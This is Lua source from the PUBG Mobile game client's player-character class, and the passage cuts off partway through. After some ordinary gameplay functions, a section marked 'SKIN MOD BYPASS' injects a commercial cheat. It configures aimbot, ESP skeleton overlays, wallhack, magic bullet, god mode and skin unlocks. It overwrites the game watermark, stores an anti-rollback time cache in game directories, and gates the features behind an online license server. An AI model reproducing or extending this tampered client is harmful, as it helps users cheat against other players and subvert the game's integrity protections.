    print(bWriteLog and bWriteLog and string.format("%s ResetMeshRelativeLocationAndRotation() Mesh.RelativeRotation: %s %s %s   Pawn.BaseRotationOffset:%s %s %s ", Game:GetPlainName(self.Object), tostring(vRelativeRot.Pitch), tostring(vRelativeRot.Yaw), tostring(vRelativeRot.Roll), tostring(vBaseRotation.Pitch), tostring(vBaseRotation.Yaw), tostring(vBaseRotation.Roll)))
  end
end

function BRPlayerCharacterBase:HandleOnMovementModeChangedNew()
  print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged11")
  local EMovementMode = import("EMovementMode")
  if Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Swimming and self:CheckBaseIsMoveable() then
    print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged22")
    self.CharacterMovement:SetBase(nil, "", true)
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy and Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Walking and UIManager.UI_Config_InGame.ParachuteOpenUI then
    print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChangedNew CloseUI")
    UIManager.CloseUI(UIManager.UI_Config_InGame.ParachuteOpenUI)
  end
end

function BRPlayerCharacterBase:BPOnMissPlayerDamageRecord()
end

function BRPlayerCharacterBase:PreAttachedToVehicle()
  local UKismetSystemLibrary = import("KismetSystemLibrary")
  local IsDS = UKismetSystemLibrary.IsDedicatedServer(self)
  if not IsDS then
    return
  end
  local MainPlayerController = self:GetPlayerControllerSafety()
  if not slua.isValid(MainPlayerController) then
    return
  end
  local CharacterAvatarComp2_BP = self.CharacterAvatarComp2_BP
  if not slua.isValid(CharacterAvatarComp2_BP) then
    return
  end
  local CommerAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.CommerAvatarDataUtil")
  local changedVehicleId = CommerAvatarDataUtil:ChangeVehicleSkinByClothes(MainPlayerController, CharacterAvatarComp2_BP)
  local ESTExtraVehicleShapeType = import("ESTExtraVehicleShapeType")
  if changedVehicleId then
    local UAvatarUtils = import("AvatarUtils")
    if UAvatarUtils.GetVehicleShapeBySkinID(changedVehicleId) == ESTExtraVehicleShapeType.VST_Horse then
      local uCurPlayerState = self:GetPlayerStateSafety()
      if slua.isValid(uCurPlayerState) then
        print(bWriteLog and "  BRPlayerCharacterBase:PreAttachedToVehicle. changedVehicleId: " .. tostring(changedVehicleId))
        uCurPlayerState:AddGeneralCount(468, 1, false)
      end
    end
  end
end
BRPlayerCharacterBase.ClientRPC.ClientRPC_TriggerHighlightMoment = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.UInt32,
    UEnums.EPropertyClass.UInt32
  }
}

function BRPlayerCharacterBase:ClientRPC_TriggerHighlightMoment(Type, Param)
  print(bWriteLog and string.format("BRPlayerCharacterBase:ClientRPC_TriggerHighlightMoment Type = %d, Param = %s", Type, Param))
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_TRIGGER_HIGHLIGHT_MOMENT, Type, Param)
end

function BRPlayerCharacterBase:ParachuteJump()
  local uPlayerController = self:GetControllerSafety()
  if slua.isValid(uPlayerController) then
    if not self:GetEnsure() then
      local EStateType = import("EStateType")
      if uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteJump and uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteOpen then
        local ESTEPoseState = import("ESTEPoseState")
        self:SwitchPoseState(ESTEPoseState.Stand, true, true, true, false)
        uPlayerController:ReInitParachuteItem()
        uPlayerController:ServerChangeStatePC(EStateType.State_ParachuteJump)
      end
      print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump over")
    else
      EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_AI_CALL_PARACHUTE_JUMP, self.Object)
      print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump AI JUMP over, Loc=", tostring(self:K2_GetActorLocation():ToString()))
    end
  end
end

function BRPlayerCharacterBase:OnMovementBaseChangedEvent(uCharacter, uNewMovementBase, uOldMovementBase)
  if uCharacter ~= self.Object then
    return
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase:OnMovementBaseChangedEvent %s, Base: %s -> %s", uCharacter, uOldMovementBase, uNewMovementBase))
  local MedievalCrane = self:GetMedievalCraneFromBase(uNewMovementBase)
  if MedievalCrane and MedievalCrane.AddCharacter then
    MedievalCrane:AddCharacter(self.Object)
  else
    MedievalCrane = self:GetMedievalCraneFromBase(uOldMovementBase)
    if MedievalCrane and MedievalCrane.RemoveCharacter then
      MedievalCrane:RemoveCharacter(self.Object)
    end
  end
end

function BRPlayerCharacterBase:GetMedievalCraneFromBase(Base)
  if not slua.isValid(Base) or not Base.GetOwner then
    return
  end
  local Lifter = Base:GetOwner()
  if not slua.isValid(Lifter) then
    return
  end
  if not Lifter.AddCharacter then
    return
  end
  return Lifter
end

function BRPlayerCharacterBase:CheckForbidFlaregun()
  local uPlayerState = self:GetPlayerStateSafety()
  if not slua.isValid(uPlayerState) then
    return false
  end
  if uPlayerState.CanUseFlaregun == false and self:IsLocallyControlled() then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:DisplayGameTipWithMsgID(48532)
    end
  end
  return not uPlayerState.CanUseFlaregun
end

function BRPlayerCharacterBase:ServerRPC_NearDeathGiveupRescue()
  self:HandleNearDeathGiveupRescue()
end

function BRPlayerCharacterBase:HandleNearDeathGiveupRescue()
  local uNearDeathComp = self.NearDeatchComponent
  if self:IsNearDeath() and slua.isValid(uNearDeathComp) and self.bCanNearDeathGiveup == true then
    local uPlayerState = self:GetPlayerStateSafety()
    if slua.isValid(uPlayerState) then
      uPlayerState:AddGeneralCount(1613, 1, false)
    end
    uNearDeathComp:TriggerGotoDieExplictly(self.Object)
  end
end

function BRPlayerCharacterBase:RPC_Server_GmPlayAction(actionId)
  log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction.  actionId: " .. tostring(actionId))
  local USTExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
  if USTExtraBlueprintFunctionLibrary.IsDevelopment() then
    log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction. IsDevelopment actionId: " .. tostring(actionId))
    self:MulticastRPC_GmPlayAction(actionId)
  end
end

function BRPlayerCharacterBase:MulticastRPC_GmPlayAction(actionId)
  if not Client then
    return
  end
  log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction.  actionId: " .. tostring(actionId))
  local uPlayEmoteComp = self:GetPlayEmoteComponent()
  if not slua.isValid(uPlayEmoteComp) then
    return
  end
  local LogFilter = require("common.log_filter")
  LogFilter.SetLogTreeEnable(true)
  local animCfg = CDataTable.GetTableData("EmoteBPTable", actionId)
  if not animCfg then
    return
  end
  local handlePath = animCfg.Path
  local EmoteHandleAsset = slua.loadObject(handlePath)
  local assetsArray = slua.Array(UEnums.EPropertyClass.Struct, import("/Script/CoreUObject.SoftObjectPath"))
  local handle = EmoteHandleAsset()
  uPlayEmoteComp:OnLoadEmoteAssetBegin(handle, actionId, assetsArray, "")
  log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction. assetsArray:Num(): " .. tostring(assetsArray:Num()))
  local tb = FuncUtil.LuaArrayToTable(assetsArray)
  local asset_util = require("common.asset_util")
  local loadLater = function()
    uPlayEmoteComp:OnLoadEmoteAssetEnd(handle, actionId, 0)
  end
  asset_util.GetAssetsArrayAsyncParallel(tb, loadLater)
end

function BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall(bServerSyncShouldCheckPassWall)
  print(bWriteLog and "BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall " .. tostring(bServerSyncShouldCheckPassWall))
  if slua.isValid(self.ParachuteComponent) then
    self.ParachuteComponent.bServerSyncShouldCheckPassWall = bServerSyncShouldCheckPassWall
  end
end

function BRPlayerCharacterBase:OnPlayerEnterCarryBoxState()
  self.Super:OnPlayerEnterCarryBoxState()
  local CharName = self:GetPlayerNameSafety()
  print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerEnterCarryBoxState Role:%s PlayerKey:%s Name:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName)))
  if self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:OnPlayerEnterCarryBoxState()
  end
end

function BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  self.Super:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  local CharName = self:GetPlayerNameSafety()
  print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState Role:%s PlayerKey:%s Name:%s bInIsInterrupt:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName), tostring(bInIsInterrupt)))
  if self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  end
end

function BRPlayerCharacterBase:ServerRPC_CarryDeadBox(uInDeadBox)
  if slua.isValid(uInDeadBox) and Game:IsClassOf(uInDeadBox, import("/Script/ShadowTrackerExtra.PlayerTombBox")) and self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:CarryDeadBox(uInDeadBox)
  end
end

function BRPlayerCharacterBase:SetAreaID(AreaID)
  self:SetAttrValue("AreaID", AreaID, -1)
end

function BRPlayerCharacterBase:GetAreaID()
  return math.floor(self:GetAttrValue("AreaID") + 0.5)
end

function BRPlayerCharacterBase:CannotChangeIntoPetSpectator()
  print(bWriteLog and "BRPlayerCharacterBase:CannotChangeIntoPetSpectator")
  return self.bCannotChangeIntoPetSpectator
end

function BRPlayerCharacterBase:DoModChangeToBT()
  print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s", tostring(self.PlayerKey)))
  if self:HasState(EPawnState.SpecialSuit) then
    self:TriggerEntrySkillWithID(4301101, true)
    print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s, HasState(EPawnState.SpecialSuit)", tostring(self.PlayerKey)))
  end
end

function BRPlayerCharacterBase:SwitchCameraToParachuteOpening()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening")
  self.Super:SwitchCameraToParachuteOpening()
  if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
    self.ParachuteFormation:OverlayFormationCameraParams()
    print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening - Formation camera overlaid")
  end
end

function BRPlayerCharacterBase:SwitchCameraToParachuteFalling()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling")
  self.Super:SwitchCameraToParachuteFalling()
  if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
    self.ParachuteFormation:OverlayFormationCameraParams()
    print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling - Formation camera overlaid")
  end
end

function BRPlayerCharacterBase:SwitchCameraToNormal()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToNormal")
  self.Super:SwitchCameraToNormal()
  if self.ParachuteFormation and self.ParachuteFormation.OnLandingClearFormationCamera then
    self.ParachuteFormation:OnLandingClearFormationCamera()
  end
end

function BRPlayerCharacterBase:SwitchWeaponCheck(Slot, IgnoreState)
  if self:HasState(EPawnState.AttachToOther) then
    local Weapon = self:GetWeaponBySlot(Slot)
    if slua.isValid(Weapon) then
      local WeaponID = Weapon:GetWeaponID()
      local AttachToOtherConfig = GamePlayTools.GetCurrentConfig("AttachToOtherConfig")
      if AttachToOtherConfig and AttachToOtherConfig.CheckIsWeaponInBlackList and AttachToOtherConfig.CheckIsWeaponInBlackList(WeaponID) then
        print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck not allow switch weapon in AttachToOther, WeaponID: " .. tostring(WeaponID))
        local uPlayerController = self:GetPlayerControllerSafety()
        if Client and slua.isValid(uPlayerController) and uPlayerController.Role == ENetRole.ROLE_AutonomousProxy then
          uPlayerController:DisplayGameTipWithMsgID(47306)
        end
        return false
      end
    end
  end
  return self.Super:SwitchWeaponCheck(Slot, IgnoreState)
end

-- ==============================================================================
-- ========================== CHEN PUBG SKIN MOD BYPASS ==========================
-- ==============================================================================

local function Notify(msg) local s = "[SHAYAN VIP New] " .. tostring(msg)
pcall(function() if _G.LexusNotify then _G.LexusNotify(s) end end)
pcall(function() local sh = import("ScriptHelperClient") if sh and
sh.AddOnScreenDebugMessage then sh.AddOnScreenDebugMessage(s, -1, 3.0, {R=1,
G=1, B=0, A=1}, {X=1.2, Y=1.2}) end end) print(s) end

local _slua = rawget(_G, "slua")

local function Valid(obj) if not obj then return false end if _slua and
_slua.isValid then local ok, v = pcall(_slua.isValid, obj) if not ok or not v
then return false end end return true end

-- ========================================== 
-- STATIC VARIABLES & GLOBAL CHEN PUBG SKIN
-- ========================================== 
local C_GREEN = {R=0, G=255, B=0, A=255}
local C_RED = {R=255, G=0, B=0, A=255}
local C_CYAN = {R=0, G=255, B=255, A=255}
local C_YELLOW = {R=255, G=255, B=0, A=255}
local C_WHITE = {R=255, G=255, B=255, A=255}
local C_BLUE_TEXT = {R=0, G=200, B=255, A=255}
local SCALE_COLOR_V2 = {R=3, G=3, B=0, A=0}

local GLOBAL_BONE_LIST = {
    "head", "neck_01", "pelvis",
    "upperarm_r", "lowerarm_r", "hand_r",
    "upperarm_l", "lowerarm_l", "hand_l",
    "thigh_l", "calf_l", "foot_l",
    "thigh_r", "calf_r", "foot_r"
}

local GLOBAL_CONNECTIONS = {
    {"neck_01", "pelvis", C_YELLOW},
    {"neck_01", "upperarm_l", C_CYAN}, {"upperarm_l", "lowerarm_l", C_CYAN}, {"lowerarm_l", "hand_l", C_CYAN},
    {"neck_01", "upperarm_r", C_CYAN}, {"upperarm_r", "lowerarm_r", C_CYAN}, {"lowerarm_r", "hand_r", C_CYAN},
    {"pelvis", "thigh_l", C_CYAN}, {"thigh_l", "calf_l", C_CYAN}, {"calf_l", "foot_l", C_CYAN},
    {"pelvis", "thigh_r", C_CYAN}, {"thigh_r", "calf_r", C_CYAN}, {"calf_r", "foot_r", C_CYAN}
}

-- ========================================== 
-- CHEN PUBG SKIN + FULL FEATURES VIP 
-- ========================================== 
_G.LexusConfig = _G.LexusConfig or { 
    CustomMagicBullet = false,
    AutoHead = false, 
    EspVip = false, 
    EspDistance = false, 
    EspVipPro = false, 
    EspRadar = false, 
    EspLoai5 = false, 
    EspLoai6 = false, 
    EspLoai7 = false,
    EspAntenna = false, 
    EspOutline = false, 
    OutlineThickness = 10, 
    UnlockFPS = false, 
    IpadView = false, 
    CustomAimbot = false, 
    CustomAimbotClose = false, 
    CustomHRecoil = false,  
    CustomVRecoil = false,  
    LessShake = false, 
    RemoveGrass = false, 
    RemoveFog = false, 
    WhiteBody = false, 
    ColorBodyV2 = false,    
    WallXuyenTuong = false, 
    Crosshair = false, 
    Accuracy = false,
    GodMode = false, 
    WallClimb = false,
    FastCar = false,
    BlackSky = false,
    
    -- Config Mới Cho Aimbot V2 (Aim Touch)
    AimTouchEnable = false,
    AimTouchHipIgKnock = false,
    AimTouchHipIgBot = false,
    AimTouchSGIgKnock = false,
    AimTouchSGIgBot = false,
    AimTouchHipVisCheck = true,
    AimTouchSGVisCheck = true,
    AimTouchHipfire = false,
    AimTouchSG = false,
    AimTouchSGAutoFire = false,
    AimTouchScopeAll = false,
    AimTouchScopeIgKnock = false,
    AimTouchScopeIgBot = false,
    AimTouchScopeVisCheck = true,
    AimTouchScopeSniper = false,
    AimTouchSniperIgKnock = false,
    AimTouchSniperIgBot = false,
    AimTouchSniperVisCheck = true,
    AimTouchMortar = false,
    
    -- Config Mod Skin VIP
    BulletTrack = false,           -- BT master switch
    BulletTrackFOV = 80,           -- FOV: 0-100 = pixel radius (1 step = 1px)
    BulletTrackMaxDist = 150,      -- max jarak 0-500m (slider step = 5m)
    BulletTrackTarget = 2,         -- 1=Head  2=Chest  3=Pelvis  4=Auto(Head>Chest>Pelvis)
    SkinOptionOpen = false,
    
    -- LostTomb Features (Added from LostTomb_PlayerCharacter)
    EnableDamageAnalysis = false,
    IgnoreFallingDamage = false,
    DisableAIIgnoreEnemyTarget = false,
    EnableMeleeDamageReport = false,
    ShowKnowledgeUI = false,
    EnableQTESystem = false,
    EnablePoisonSystem = false,
    AutoHideWeapon = false,
    CharacterOverrideAvatar = false,
    EnableSkillFlowReport = false,
    EnableSupplyBoxEvolution = false,
    EnableMaxWalkSpeedCurve = false,
    ShowHeadHPBar = false,
    EnableCustomGender = false,
    EnableLoadingAvatar = false,
    EnableSmokeParticle = false,
    EnableDamageShake = false,
    EnableStealLifeEffect = false,
    EnableTombBoxFilter = false,
    EnableGameStartSpeedUp = false,
    ExtraEnergyBonus = false,
    BehindAttackBonus = false,
}

_G.LexusState = _G.LexusState or { 
    LoopToken = 0, 
    NativeESPReady = false,
    GraphicsUnlocked = false, 
    MenuStep = 0, 
    LastCmdTime = 0,
    TrackedMarks = {},
    EnemyMarks = {},
    LastAimbotCheckTime = 0,
    IsAutoFiring = false, 
    CustomTextData = {
        SkinSuit = 1, SkinBag = 1, SkinHelmet = 1,
        SkinM416 = 1, SkinAKM = 1, SkinSCAR = 1, SkinM762 = 1, SkinAUG = 1,
        SkinUMP = 1, SkinUZI = 1, SkinGroza = 1, SkinS12K = 1, SkinDBS = 1,
        SkinDacia = 1, SkinUAZ = 1, SkinCoupe = 1, SkinBuggy = 1, SkinMirado = 1,
        -- AimTouch defaults
        AimTouchHipPrio = 1, AimTouchHipBone = 1, AimTouchHipCond = 1, AimTouchHipSpeed = 50, AimTouchHipFOV = 30, AimTouchHipDist = 250,
        AimTouchSGPrio = 1, AimTouchSGBone = 2, AimTouchSGCond = 1, AimTouchSGSpeed = 80, AimTouchSGFOV = 40, AimTouchSGDist = 30,
        AimTouchScopePrio = 1, AimTouchScopeBone = 2, AimTouchScopeCond = 1, AimTouchScopeSpeed = 40, AimTouchScopeFOV = 20, AimTouchScopeDist = 300, AimTouchScopePred = 0, AimTouchScopeRecoil = 0,
        AimTouchSniperPrio = 1, AimTouchSniperBone = 1, AimTouchSniperCond = 2, AimTouchSniperSpeed = 30, AimTouchSniperFOV = 20, AimTouchSniperDist = 400, AimTouchSniperPred = 0,
        AimTouchMortarPred = 0, AimTouchMortarFOV = 360,
    },     
    LastAimbotConfigString = "",
    MagicUpdateVersion = 1,
    LastMagicConfigHash = "",
    PrevGraphicsState = {},
    
    -- LostTomb State Variables
    StealLifeCount = 0,
    KillPlayerNum = 0,
    IsInMineArea = false,
    AIIgnoreEnemyTarget_RefCount = 0,
    SmokeParticleList = {},
    CachedSkillFlow = {},
    LastPlayEmoteID = nil,
    IsShowLoadingAvatar = false,
    IsCloseCharacterOverrideAvatar = false,
}

local limitTime = os.time({ year = 2028, month = 10, day = 15, hour = 23, min = 59, sec = 0 })
local currentTime = os.time(os.date("!*t"))
local isExpired = false

pcall(function()
    local fileName = ".sys_time_cache"
    local paths = {
        "//storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "//storage/emulated/0/Android/data/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "//storage/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "//storage/emulated/0/Android/data/com.rekoo.pubgm/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "//storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "//storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName,
        "//storage/emulated/0/Android/data/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName,
        "//storage/emulated/0/Android/data/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName,
        "//storage/emulated/0/Android/data/com.rekoo.pubgm/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName,
        "//storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName,
        "Documents/ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "Documents/ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName,
        "/Documents/ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "/Documents/ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName,
        "ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName,
        "../../ShadowTrackerExtra/Saved/SaveGames/" .. fileName,
        "../../ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName
    }
    
    if os and os.getenv then
        local homeDir = os.getenv("HOME")
        if homeDir and homeDir ~= "" then
            table.insert(paths, 1, homeDir .. "/Documents/ShadowTrackerExtra/Saved/SaveGames/" .. fileName)
            table.insert(paths, 2, homeDir .. "/Documents/ShadowTrackerExtra/Saved/Gamelet/logs/" .. fileName)
        end
    end
    
    local tm = package.loaded["client.logic.common.TimeManager"]
    if not tm then 
        local s, r = pcall(require, "client.logic.common.TimeManager")
        if s and r then tm = r end
    end
    if tm and type(tm.GetServerTime) == "function" then
        local serverTime = tm.GetServerTime()
        if serverTime and serverTime > 1700000000 then 
            currentTime = serverTime
        end
    end

    local lastSeenTime = 0
    for _, path in ipairs(paths) do
        local file = io.open(path, "r")
        if file then
            local data = file:read("*a")
            local savedTime = tonumber(data) or 0
            if savedTime > lastSeenTime then
                lastSeenTime = savedTime
            end
            file:close()
        end
    end

    if currentTime < lastSeenTime then
        currentTime = lastSeenTime
    else
        for _, path in ipairs(paths) do
            local file = io.open(path, "w")
            if file then
                file:write(tostring(currentTime))
                file:close()
            end
        end
    end
end)

isExpired = (currentTime > limitTime)

-- Watermark
local wm = require("client.slua.logic.lobby_watermark.logic_lobby_watermark")
wm.GetWatermarkString = function() return "@SHAYAN_TOOL1" end
wm.GetFightingWatermarkString = function() return "@SHAYAN_TOOL1" end

-- ==============================================================================
-- ================== ONLINE KEY VERIFICATION SYSTEM (SHADOW ) =============
-- ==============================================================================
_G.__SHD_LICENSE = _G.__SHD_LICENSE or {}
local _L = _G.__SHD_LICENSE

_L.API_URL = "https://kuro-api-pannel.vercel.app/api/connect"
_L.LICENSE_GAMES = "PUBG"
_L.APP_VERSION = "1.0.0"
_L.SECRET_SUFFIX = "SHAYAN"

_L.KeyStorePaths = _L.KeyStorePaths or {
    "/sdcard/BRPlay/.brplay_license_key",
    "/storage/emulated/0/BRPlay/.brplay_license_key",
    "/sdcard/Android/data/com.tencent.ig/files/.brplay_license_key",
    "/storage/emulated/0/Android/data/com.tencent.ig/files/.brplay_license_key",
    "./.brplay_license_key",
    "brplay_license.key"
}

_L.LoadSavedKey = function()
    local cached = _G.__SHD_LICENSE_KEY or _L.CachedKey or ""
    if cached ~= "" then return tostring(cached) end

    local function pref_get()
        local value = nil
        pcall(function()
            if luajava then
                local ActivityThread = luajava.bindClass("android.app.ActivityThread")
                local app = ActivityThread.currentApplication()
                if app then
                    local prefs = app:getSharedPreferences("brplay_license", 0)
                    value = prefs:getString("saved_license_key", nil)
                end
            end
        end)
        return value
    end

    local prefKey = pref_get()
    if prefKey and tostring(prefKey) ~= "" then
        prefKey = tostring(prefKey):gsub("^%s+", ""):gsub("%s+$", ""):gsub("[%r%n%s]+", "")
        if prefKey ~= "" then
            _L.CachedKey = prefKey
            _G.__SHD_LICENSE_KEY = prefKey
            _L.KeyStorePath = "SharedPreferences"
            return prefKey
        end
    end

    if not io or not io.open then return "" end
    for _, path in ipairs(_L.KeyStorePaths) do
        local f = nil
        pcall(function() f = io.open(path, "r") end)
        if f then
            local k = f:read("*a") or ""
            pcall(function() f:close() end)
            k = tostring(k):gsub("^%s+", ""):gsub("%s+$", ""):gsub("[%r%n%s]+", "")
            if k ~= "" then
                _L.CachedKey = k
                _G.__SHD_LICENSE_KEY = k
                _L.KeyStorePath = path
                return k
            end
        end
    end
    return ""
end

_L.SaveKey = function(key)
    key = tostring(key or ""):gsub("^%s+", ""):gsub("%s+$", ""):gsub("[%r%n%s]+", "")
    if key == "" then return false end

    local prefSaved = false
    pcall(function()
        if luajava then
            local ActivityThread = luajava.bindClass("android.app.ActivityThread")
            local app = ActivityThread.currentApplication()
            if app then
                local prefs = app:getSharedPreferences("brplay_license", 0)
                local editor = prefs:edit()
                editor:putString("saved_license_key", key)
                editor:apply()
                prefSaved = true
            end
        end
    end)

    if prefSaved then
        _L.KeyStorePath = "SharedPreferences"
        _L.CachedKey = key
        _G.__SHD_LICENSE_KEY = key
        return true
    end

    if not io or not io.open then return false end
    for _, path in ipairs(_L.KeyStorePaths) do
        local f = nil
        pcall(function() f = io.open(path, "w") end)
        if f then
            local ok = pcall(function()
                f:write(key)
                if f.flush then f:flush() end
                f:close()
            end)
            if ok then
                _L.KeyStorePath = path
                _L.CachedKey = key
                _G.__SHD_LICENSE_KEY = key
                return true
            end
            pcall(function() f:close() end)
        end
    end
    return false
end

_L.CachedKey = _L.LoadSavedKey()
_L.InputWidget = nil
_L.InputBox = nil
_L.InputButton = nil
_L.InputRoot = nil
_L.InputParent = nil
_L.InputBusy = false
_L.InputWidgets = _L.InputWidgets or {}

-- STRICT LICENSE GATE:
-- The mod menu and mod systems stay locked until the server validates the key.
_G.ModMenuUnlocked = (_G.ModMenuUnlocked == true)
_G.ModFeaturesEnabled = (_G.ModFeaturesEnabled == true)
_G.LicenseForceValidate = false
_G.LicenseWatchdogToken = (_G.LicenseWatchdogToken or 0) + 1

_L.ShowPopup = function(title, msg)
    pcall(function()
        local Msg = require("client.slua.logic.common.logic_common_msg_box")
        if Msg and Msg.Show then Msg.Show(4, title, msg) end
    end)
end

_L.CloseInput = function()
    local parent = _L.InputParent
    pcall(function()
        if _L.InputWidgets then
            for i = #_L.InputWidgets, 1, -1 do
                local w = _L.InputWidgets[i]
                pcall(function()
                    if w and slua.isValid(w) then
                        if w.SetVisibility then
                            w:SetVisibility(UEnums.ESlateVisibility.Collapsed)
                        end
                    end
                end)
                pcall(function()
                    if parent and slua.isValid(parent) and w and slua.isValid(w) and parent.RemoveChild then
                        parent:RemoveChild(w)
                    end
                end)
                pcall(function()
                    if w and slua.isValid(w) and w.RemoveFromParent then
                        w:RemoveFromParent()
                    end
                end)
                _L.InputWidgets[i] = nil
            end
        end
    end)
    pcall(function()
        if _L.InputRoot and slua.isValid(_L.InputRoot) then
            if _L.InputRoot.SetVisibility then
                _L.InputRoot:SetVisibility(UEnums.ESlateVisibility.Collapsed)
            end
            if _L.InputRoot.RemoveFromParent then
                _L.InputRoot:RemoveFromParent()
            end
        end
    end)
    _L.InputRoot = nil
    _L.InputParent = nil
    _L.InputBox = nil
    _L.InputButton = nil
    _L.InputWidget = nil
    _L.InputBusy = false
end

_L.GetMainCanvas = function()
    local canvas = nil
    pcall(function()
        local tools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools")
        local ui = tools and tools.GetMainControlBaseUI and tools.GetMainControlBaseUI()
        if ui and slua.isValid(ui) then
            if ui.CanvasPanel_0 and slua.isValid(ui.CanvasPanel_0) then
                canvas = ui.CanvasPanel_0
            elseif ui.CanvasPanel_42 and slua.isValid(ui.CanvasPanel_42) then
                canvas = ui.CanvasPanel_42
            end
        end
    end)
    return canvas
end

_L.AddClick = function(button, fn)
    if not button or not fn then return false end
    local ok = false
    pcall(function()
        if button.OnClicked and button.OnClicked.Add then
            button.OnClicked:Add(fn)
            ok = true
        end
    end)
    if not ok then
        pcall(function()
            if button.OnClicked and button.OnClicked.AddUnique then
                button.OnClicked:AddUnique(fn)
                ok = true
            end
        end)
    end
    return ok
end

_L.AddPress = function(button, fn)
    if not button or not fn then return false end
    local ok = false
    pcall(function()
        if button.OnPressed and button.OnPressed.Add then
            button.OnPressed:Add(fn)
            ok = true
        end
    end)
    if not ok then
        pcall(function()
            if button.OnPressed and button.OnPressed.AddUnique then
                button.OnPressed:AddUnique(fn)
                ok = true
            end
        end)
    end
    return ok
end

_L.GetText = function(box)
    if not box then return "" end
    local text = nil
    pcall(function()
        if box.GetText then text = box:GetText() end
    end)
    if text == nil then return "" end
    pcall(function()
        if text.ToString then text = text:ToString() end
    end)
    text = tostring(text or "")
    text = text:gsub("^%s+", ""):gsub("%s+$", "")
    text = text:gsub("[%r%n]+", "")
    return text
end

_L.ShowKeyInput = function(callback)
    if _L.InputBusy then return end
    _L.InputBusy = true

    local Parent = _L.GetMainCanvas()
    if not Parent or not slua.isValid(Parent) then
        _L.InputBusy = false
        _L.ShowPopup("LICENSE ERROR", "Game UI is not ready. Please wait a moment and try again.")
        return
    end

    _L.CloseInput()
    _L.InputBusy = true
    _L.InputParent = Parent

    local V2 = import("Vector2D") or FVector2D
    local LC = import("LinearColor") or FLinearColor
    local SC = import("SlateColor") or import("/Script/SlateCore.SlateColor")

    local ViewW, ViewH = 1920, 1080
    pcall(function()
        local PC = nil
